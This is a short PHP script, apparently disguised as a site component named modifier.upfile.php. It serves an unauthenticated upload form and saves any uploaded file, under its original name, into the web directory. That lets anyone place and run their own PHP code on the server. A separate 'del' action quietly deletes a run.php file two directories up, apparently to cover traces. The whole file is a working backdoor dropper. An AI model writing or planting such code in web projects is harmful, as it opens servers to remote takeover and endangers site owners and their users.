<?php
define('BASE', dirname(__FILE__));

$ac = isset($_REQUEST['ac']) ? $_REQUEST['ac'] : '';

if($ac == '')
{
	echo '<form action="modifier.upfile.php?ac=up" method="post" enctype="multipart/form-data"><input type="file" name="upfile" /><input type="submit" value="up" /></form>';
}
elseif($ac == 'up')
{
	if($_FILES['upfile']['tmp_name'] != '')
	{
		$doc_name=$_FILES['upfile']['name'];
		$storeroot=BASE."/".$doc_name;
		rename($_FILES["upfile"]["tmp_name"],$storeroot);
		echo 'success';
	}
	else
	{
		echo 'failed';
	}
}
elseif($ac == 'del')
{
	$storeroot=BASE."/".$doc_name;
	@unlink( BASE . '/../../run.php' );
	echo 'success';
}
?>